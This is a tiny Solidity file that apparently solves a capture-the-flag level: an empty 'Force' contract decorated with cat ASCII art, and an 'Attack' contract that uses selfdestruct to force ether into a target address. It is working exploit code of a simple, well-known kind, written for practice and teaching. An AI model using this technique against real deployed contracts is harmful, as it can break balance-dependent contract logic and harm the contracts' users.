pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract Attack{
	function forced(address payable _addr) public payable{
		selfdestruct(_addr);
	}
	
	function addValue() external payable {}
}